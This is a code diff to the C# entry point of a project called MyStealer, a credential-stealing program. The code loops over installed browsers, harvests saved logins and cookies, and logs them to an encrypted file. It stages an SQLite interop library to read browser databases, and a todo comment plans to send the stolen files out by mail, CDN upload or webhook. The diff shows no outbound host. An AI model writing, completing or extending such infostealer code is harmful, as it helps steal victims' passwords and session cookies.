@@ -1,5 +1,5 @@
-﻿using MyStealer.Modules;
-using MyStealer.Modules.Browser;
+﻿using MyStealer.Collectors;
+using MyStealer.Collectors.Browser;
 using MyStealer.Modules.Browser.ChromiumBased;
 using Serilog;
 using System;
@@ -22,21 +22,27 @@ namespace MyStealer
             {
                 try
                 {
+                    /* Prepare */
 
+                    NativeMethods.WriteSqliteInterop();
                     if (File.Exists(Config.LogFilePath))
                         File.Delete(Config.LogFilePath); // Delete previous file to prevent appending encryption header
+
                     var logConfig = new LoggerConfiguration();
                     logConfig = (args.Length > 0 && args[0] == "verbose") ? logConfig.MinimumLevel.Verbose() : logConfig.MinimumLevel.Debug();
                     logConfig = logConfig.WriteTo.File(Config.LogFilePath, hooks: encHook);
                     Log.Logger = logConfig.CreateLogger();
+
+                    /* Do the job */
+
                     Log.Information("Program entry point called on: {date}", DateTime.Now);
 
                     var creds = new HashSet<CredentialEntry>();
                     var cookies = new HashSet<CookieEntry>();
                     foreach (var browser in BrowserCollectors)
                     {
-                        Log.Debug("Checking browser: {browser}", browser.ApplicationName);
-                        if (browser.Check())
+                        Log.Debug("Check if browser is available: {browser}", browser.ApplicationName);
+                        if (browser.IsAvailable())
                         {
                             Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
                             browser.Initialize();
@@ -46,6 +52,10 @@ namespace MyStealer
                                 cookies.Add(cookie);
                         }
                     }
+
+                    /* Cleanup */
+
+                    NativeMethods.CleanupSqliteInterop();
                 }
                 catch (Exception ex)
                 {
@@ -57,7 +67,9 @@ namespace MyStealer
                 }
             }
 
-            // debug purpose
+            /* todo: send files over the internet (send to mail, upload to cdn, webhook, etc.) */
+
+            // todo: debug purpose, remove later
             MyCryptExt.DecryptToFile(Config.LogFilePath + ".dec", File.OpenRead(Config.LogFilePath));
         }
     }
